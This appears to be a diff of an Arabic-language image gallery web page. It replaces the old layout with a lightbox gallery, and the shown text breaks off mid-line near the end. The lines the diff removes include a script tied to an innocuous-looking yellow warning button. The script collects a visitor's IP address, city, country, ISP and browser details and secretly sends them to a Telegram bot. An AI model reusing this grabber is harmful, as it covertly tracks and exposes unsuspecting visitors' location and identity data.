@@ -1,85 +1,143 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>طائفة الظلام - DKSTx666</title>
-  <link href="https://fonts.googleapis.com/css2?family=Cairo&display=swap" rel="stylesheet" />
   <style>
     body {
       margin: 0;
-      font-family: 'Cairo', sans-serif;
+      font-family: Arial, sans-serif;
       background: radial-gradient(circle, pink 10%, #ffe6f0);
+      overflow-x: hidden;
+      direction: rtl;
+    }
+
+    .top-description {
+      background: linear-gradient(90deg, #4b0082, black, #4b0082);
+      color: white;
+      padding: 15px;
+      font-weight: bold;
+      font-size: 16px;
+      text-align: center;
+      animation: fadeInOut 5s ease-in-out infinite;
+    }
+
+    @keyframes fadeInOut {
+      0%, 100% { opacity: 0.1; }
+      50% { opacity: 1; }
     }
 
     header {
-      text-align: center;
-      padding: 1em;
+      background-image: url('5alfia.png');
+      background-size: cover;
+      background-position: center;
+      height: 250px;
+      position: relative;
     }
 
-    header img {
-      width: 120px;
-      height: 120px;
+    .profile-pic {
+      width: 110px;
+      height: 110px;
       border-radius: 50%;
       border: 5px solid white;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+      background-image: url('profile.png');
+      background-size: cover;
+      background-position: center;
+      position: absolute;
+      bottom: -55px;
+      right: 20px;
+      animation: pulse 2s infinite;
+      box-shadow: 0 0 10px purple;
     }
 
-    main {
-      padding: 1em;
+    @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 rgba(255, 255, 0, 0.8); }
+      70% { box-shadow: 0 0 0 15px rgba(255, 255, 0, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(255, 255, 0, 0); }
+    }
+
+    .posts-container {
       display: grid;
       grid-template-columns: repeat(5, 1fr);
       gap: 10px;
+      padding: 90px 10px 30px;
     }
 
-    .img-box {
-      position: relative;
-      overflow: hidden;
-      cursor: pointer;
-      display: none;
-    }
-
-    .img-box img {
+    .post-img {
       width: 100%;
-      height: auto;
-      transition: transform 0.3s ease;
+      height: 110px;
+      object-fit: cover;
+      border-radius: 10px;
+      transition: 0.3s;
+      cursor: pointer;
     }
 
-    .img-box:hover img {
-      transform: scale(1.1);
+    .post-img:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 10px #4b0082;
+    }
+
+    .lightbox {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.9);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 999;
+      flex-direction: column;
+    }
+
+    .lightbox img {
+      max-width: 90%;
+      max-height: 80%;
+      border-radius: 10px;
+      margin-bottom: 20px;
+    }
+
+    .lightbox:target {
+      display: flex;
+    }
+
+    .close-btn {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      font-size: 30px;
+      color: white;
+      text-decoration: none;
     }
 
     .download-btn {
-      position: absolute;
-      bottom: 5px;
-      left: 5px;
-      background: rgba(255, 255, 255, 0.8);
-      padding: 5px 10px;
-      font-size: 12px;
-      border-radius: 5px;
+      background-color: purple;
+      color: white;
+      padding: 10px 20px;
+      border-radius: 10px;
       text-decoration: none;
-      color: #000;
     }
 
     .video-fab {
       position: fixed;
       bottom: 20px;
       right: 20px;
-      background-color: red;
-      color: white;
-      border-radius: 50%;
       width: 60px;
       height: 60px;
+      border-radius: 50%;
+      background-color: black;
+      color: pink;
       display: flex;
-      justify-content: center;
       align-items: center;
+      justify-content: center;
       font-size: 24px;
-      box-shadow: 0 0 15px red;
+      box-shadow: 0 0 15px pink;
+      animation: pulse 2s infinite;
       cursor: pointer;
-      z-index: 999;
+      z-index: 1000;
     }
 
-    .yellow-fab {
+    .index-fab {
       position: fixed;
       bottom: 20px;
       left: 20px;
@@ -93,84 +151,60 @@
       justify-content: center;
       font-size: 24px;
       box-shadow: 0 0 15px gold;
-      animation: pulse-yellow 2s infinite;
+      animation: pulse 1.5s infinite;
       cursor: pointer;
       z-index: 1000;
     }
 
-    @keyframes pulse-yellow {
-      0% { box-shadow: 0 0 0 0 rgba(255, 255, 0, 0.7); }
-      70% { box-shadow: 0 0 0 15px rgba(255, 255, 0, 0); }
-      100% { box-shadow: 0 0 0 0 rgba(255, 255, 0, 0); }
+    .page-numbers {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      gap: 10px;
+    }
+
+    .page-numbers span {
+      background: linear-gradient(45deg, purple, violet);
+      color: white;
+      padding: 6px 12px;
+      border-radius: 8px;
+      font-weight: bold;
+      animation: magic 3s infinite;
+    }
+
+    @keyframes magic {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.2); box-shadow: 0 0 10px purple; }
+      100% { transform: scale(1); }
     }
   </style>
 </head>
 <body>
+
+  <div class="top-description">
+    📜 ركوب جلجامشة | طائفة الظلام تتجاوز العتمة لتحكم في لأخير | نحن الذي نفعل قبل ان نتكلم |
+  </div>
+
   <header>
-    <img src="👑" alt="صورة البروفايل" />
-    <h1>طائفة الظلام - DKSTx666</h1>
+    <div class="profile-pic"></div>
   </header>
 
-  <main>
-    <!-- مربعات الصور من 1 إلى 25 -->
-    <div class="img-box"><img src="👑" /><a href="👑" download class="download-btn">تحميل</a></div>
-    <div class="img-box"><img src="👑" /><a href="👑" download class="download-btn">تحميل</a></div>
-    <div class="img-box"><img src="👑" /><a href="👑" download class="download-btn">تحميل</a></div>
-    <!-- كرر حتى 25 -->
-  </main>
+  <div class="posts-container">
+    <a href="#img1"><img src="20250502_015045.png" class="post-img"></a>
+    <a href="#img2"><img src="20250502_015045.png" class="post-img"></a>
+    <a href="#img3"><img src="20250502_015045.png" class="post-img"></a>
+    <a href="#img4"><img src="20250502_015045.png" class="post-img"></a>
+    <a href="#img5"><img src="20250502_015045.png" class="post-img"></a>
+  </div>
 
-  <div class="video-fab" onclick="playVideo()">▶️</div>
-  <div class="yellow-fab" onclick="startSniffing()">⚠️</div>
+  <!-- Lightbox -->
+  <div id="img1" class="lightbox"><a href="#" class="close-btn">×</a><img src="20250502_015045.png"><a href="20250502_015045.png" download class="download-btn">تحميل</a></div>
+  <div id="img2" class="lightbox"><a href="#" class="close-btn">×</a><img src="20250502_015045.png"><a href="20250502_015045.png" download class="download-btn">تحميل</a></div>
+  <div id="img3" class="lightbox"><a href="#" class="close-btn">×</a><img src="20250502_015045.png"><a href="20250502_015045.png" download class="download-btn">تحميل</a></div>
+  <div id="img4" class="lightbox"><a href="#" class="close-btn">×</a><img src="20250502_015045.png"><a href="20250502_015045.png" download class="download-btn">تحميل</a></div>
+  <div id="img5" class="lightbox"><a href="#" class="close-btn">×</a><img src="20250502_015045.png"><a href="20250502_015045.png" download class="download-btn">تحميل</a></div>
 
-  <script>
-    const botToken = "👑"; // توكن البوت
-    const chatId = "👑"; // معرف التليغرام
-
-    function sendToTelegram(message) {
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-      fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: message })
-      });
-    }
-
-    function getDeviceInfo() {
-      const ua = navigator.userAgent;
-      return `
-📱 User Agent: ${ua}
-🌐 لغة: ${navigator.language}
-🔋 نسبة البطارية: 👑
-⏳ زمن: ${new Date().toLocaleString()}
-`;
-    }
-
-    async function getIPDetails() {
-      const res = await fetch("https://ipinfo.io/json?token=👑");
-      return await res.json();
-    }
-
-    async function startSniffing() {
-      const ipData = await getIPDetails();
-      const info = getDeviceInfo();
-      const fullMsg = `🚨 دخول جديد من الزر الأصفر:
-
-🌍 الدولة: ${ipData.country}
-🏙️ المدينة: ${ipData.city}
-📡 IP: ${ipData.ip}
-🌐 مزود: ${ipData.org}
-🧠 معلومات إضافية:
-${info}`;
-
-      sendToTelegram(fullMsg);
-      setTimeout(() => {
-        window.location.href = "index.html";
-      }, 1000);
-    }
-
-    function playVideo() {
-      window.open("👑", "_blank");
-    }
-  </script>
-</body>
-</html>
+  <!-- FAB Buttons -->
+  <div class="video-fab" onclick="r
